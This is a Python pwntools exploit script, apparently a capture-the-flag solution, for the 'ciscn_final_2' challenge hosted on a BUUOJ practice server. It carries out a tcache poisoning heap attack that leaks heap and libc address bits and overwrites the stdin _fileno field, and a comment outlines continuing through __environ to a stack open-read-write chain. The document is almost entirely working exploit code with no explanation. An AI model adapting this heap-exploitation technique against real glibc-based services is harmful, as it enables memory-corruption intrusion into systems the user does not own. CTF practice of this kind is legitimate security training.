#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: 2020.12.04 08.51.49
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'

def add(Type,number):
		sh.sendlineafter('> ','1')
		sh.sendlineafter('>',str(Type))
		sh.sendlineafter('number:',str(number))

def message(index,cont):
		sh.sendlineafter('> ','4')
		sh.sendlineafter('at last?\n',str(cont))

def delete(Type):
		sh.sendlineafter('> ','2')
		sh.sendlineafter('>',str(Type))

def show(Type):
		sh.sendlineafter('> ','3')
		sh.sendlineafter('>',str(Type))

def show_addr(name,addr):
		log.success('The '+str(name)+' Addr:' + str(hex(addr)))


#host = 1.1.1.1
#port = 10000
local = 0
if local:
	#context.log_level = 'debug'
	libc=ELF('/glibc/x64/2.27/lib/libc.so.6')
	sh = process('./ciscn_final_2')
else:
	#context.log_level = 'debug'
	libc=ELF('./libc-2.27.so')
	sh = remote('node3.buuoj.cn',26666)



def pwn():
#tcache attack > libc_addr > __environ > main_ret_addr > tcache_attack > stack_orw
	add(1,0x90909090)
	delete(1)
	add(2,0x9090)
	delete(1)
	show(1)
	sh.recvuntil(':')
	heap_low_4bit = int(sh.recvuntil('\n',drop=1))&0xffffffff
	show_addr('heap_low_4bit',heap_low_4bit)
	add(2,0x9090)
	delete(1)
	
	add(1,heap_low_4bit+0x40)
	add(1,0)
	#gdb.attach(sh)
	add(1,0x91)
	#gdb.attach(sh)
	for i in range(7):
		delete(2)
		add(1,0x31)
	#gdb.attach(sh)
	delete(2)
	show(2)
	sh.recvuntil(':')
	libc_low_2bit = int(sh.recvuntil('\n',drop=1))&0xffff
	show_addr('libc_low_2bit',libc_low_2bit)
	_fileno_l2bit = libc_low_2bit - 0x230
	show_addr('_fileno_l2bit',_fileno_l2bit)
	#gdb.attach(sh)
	add(2,_fileno_l2bit)
	add(1,0)
	delete(1)
	add(2,_fileno_l2bit)
	delete(1)
	add(1,heap_low_4bit+0xa0)
	add(1,0)
	add(1,0)
	add(1,666)

if __name__ == '__main__':
	pwn()
	sh.interactive()

